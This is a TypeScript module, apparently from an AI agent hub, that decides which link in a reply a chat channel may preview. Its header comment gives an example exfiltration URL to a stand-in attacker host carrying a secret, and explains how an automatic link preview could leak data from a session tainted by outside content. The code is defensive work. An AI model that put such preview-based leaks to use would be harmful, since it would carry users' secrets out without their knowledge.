// Link previews (docs/superpowers/specs/2026-11-02-link-preview-design.md). A channel's servers (Telegram's) fetch a
// link of a message to draw its preview: no click, no tool call, so a reply with https://attacker.example/?d=<secret>
// would carry data out as it arrives. So the hub names the one address a reply may be previewed by: its first link,
// before outside content reached the session; after, the first that carries nothing new by the tainted-egress rule
// (policy/egress.ts). With none, the reply goes without a preview. Never a card: a preview is only a nicety.

import { linksIn, type EgressGiven, type EgressGuard } from "./egress.ts";

/** Links of a reply looked at, at most: one that passes is rarely further down. */
const MAX_LINKS = 20;

/** A session as far as its previews go. */
export interface PreviewSession {
  id: string;
  tainted: boolean;
}

/** The address (as written in `text`) a channel may draw a preview of, or undefined for none. */
export function previewOf(text: string, s: PreviewSession, guard: EgressGuard | undefined, given: () => EgressGiven): string | undefined {
  const links = linksIn(text).slice(0, MAX_LINKS);
  if (!s.tainted) return links[0];
  if (!guard) return undefined;
  let g: EgressGiven | undefined;
  return links.find((url) => !guard.check(s.id, [url], () => (g ??= given())));
}
